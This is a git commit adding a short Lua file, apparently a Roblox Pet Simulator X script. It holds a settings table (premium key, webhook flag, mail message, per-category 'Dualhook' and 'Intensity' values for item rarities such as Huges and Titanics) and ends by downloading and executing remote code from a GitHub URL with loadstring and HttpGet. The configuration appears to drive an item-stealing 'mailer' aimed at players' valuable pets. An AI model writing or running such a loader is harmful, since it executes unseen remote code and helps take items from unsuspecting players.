65cb1f3f414c506f675f1d78faa45da15c0cfb8c
SuperMonz <132682441+SuperMonz@users.noreply.github.com>
2023-05-08 02:54:16 +0700

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,44 @@
+getgenv().Settings = {
+    PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
+    Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
+    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
+    MailMessage = "Monz Very Best",
+  Titanics = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Exclusives = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Events = {
+       Dualhook = false,
+       Intensity = 100--%
+  },
+   Secrets = {
+       Dualhook = false,
+       Intensity = 100--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = false,
+       Intensity = 100--%
+   },
+   Gems = {
+       Dualhook = false,
+       Intensity = 100--%
+  }
+}
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/main.lua", true))()
